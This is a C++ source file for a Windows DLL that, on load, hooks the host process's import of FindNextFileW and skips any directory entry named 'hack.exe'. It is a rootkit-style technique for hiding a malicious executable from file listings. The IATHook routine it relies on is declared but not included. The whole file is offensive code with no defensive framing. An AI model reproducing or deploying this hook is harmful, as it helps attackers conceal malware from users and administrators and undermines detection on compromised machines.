#include"stdafx.h"
#include <Windows.h>
#include<iostream>
#include<string>
#include<tchar.h>
using namespace std;
#define WIN32_LEAN_AND_MEAN
extern "C" __declspec(dllexport)

LONG UnIATHook(__in HANDLE hHook);
void* GetIATHookOrign(__in HANDLE hHook);
typedef int(__stdcall *LPFN_FindNextFile)(_In_  HANDLE hFindFile, _Out_ LPWIN32_FIND_DATA lpFindFileData);
LONG IATHook(
	__in_opt void* pImageBase,
	__in_opt char* pszImportDllName,
	__in char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* phHook
);

HANDLE g_hHook_FindNextFile = NULL;
//////////////////////////////////////////////////////////////////////////

bool __stdcall Fake_FindNextFile(_In_  HANDLE hFindFile, _Out_ LPWIN32_FIND_DATA lpFindFileData)
{
	
	LPFN_FindNextFile fnOrigin = (LPFN_FindNextFile)GetIATHookOrign(g_hHook_FindNextFile);
	wchar_t *File = L"hack.exe";
	bool val = fnOrigin(hFindFile, lpFindFileData);
	if (0 == wcscmp(File, (wchar_t*)lpFindFileData->cFileName))//调用之后进行判断是否为目标文件
	{
		return fnOrigin(hFindFile, lpFindFileData);//再调用一次原始的findnextfile
	}
	return val;
}

DWORD WINAPI IAT(LPVOID lpParam)
{
	IATHook(
		GetModuleHandleW(NULL),
		"api-ms-win-core-file-l1-2-1.dll",
		"FindNextFileW",
		Fake_FindNextFile,
		&g_hHook_FindNextFile
	);
	return 0;
}

BOOL WINAPI DllMain(HANDLE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL,IAT, NULL, NULL, NULL);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}






